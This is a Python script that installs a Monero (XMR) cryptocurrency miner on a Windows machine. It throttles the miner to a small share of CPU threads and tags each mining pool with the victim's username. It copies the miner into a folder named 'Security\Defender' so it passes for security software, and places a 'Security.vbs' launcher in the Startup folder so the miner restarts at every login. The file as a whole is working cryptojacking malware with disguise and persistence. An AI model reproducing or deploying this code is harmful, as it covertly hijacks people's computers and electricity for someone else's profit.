import os
import json
import math
import shutil
import getpass

Script_Dir = os.path.dirname(os.path.abspath(__file__))
XMR_Source = os.path.join(Script_Dir, "XMR")
Config_Path = os.path.join(XMR_Source, "config.json")
Start_Vbs_Path = os.path.join(XMR_Source, "Start.vbs")

User_Name = getpass.getuser()
Security_Dir = os.path.join("C:\\Users", User_Name, "Security")
Defender_Dir = os.path.join(Security_Dir, "Defender")
Startup_Dir = os.path.join(
    "C:\\Users", User_Name,
    "AppData", "Roaming", "Microsoft", "Windows",
    "Start Menu", "Programs", "Startup"
)

Total_Threads = os.cpu_count() or 1

if Total_Threads <= 8:
    Mine_Threads = 1
elif Total_Threads <= 14:
    Mine_Threads = 2
elif Total_Threads <= 20:
    Mine_Threads = 3
else:
    Mine_Threads = math.floor(Total_Threads * 0.20)

Thread_Percent = min(100, math.ceil((Mine_Threads / Total_Threads) * 100))

with open(Config_Path, "r") as F:
    Config = json.load(F)

Config["cpu"]["max-threads-hint"] = Thread_Percent

for Pool in Config.get("pools", []):
    Pool["pass"] = User_Name

with open(Config_Path, "w") as F:
    json.dump(Config, F, indent=4)

os.makedirs(Security_Dir, exist_ok=True)

if os.path.exists(Defender_Dir):
    shutil.rmtree(Defender_Dir)

shutil.copytree(XMR_Source, Defender_Dir)

os.makedirs(Startup_Dir, exist_ok=True)
shutil.copy2(Start_Vbs_Path, os.path.join(Startup_Dir, "Security.vbs"))
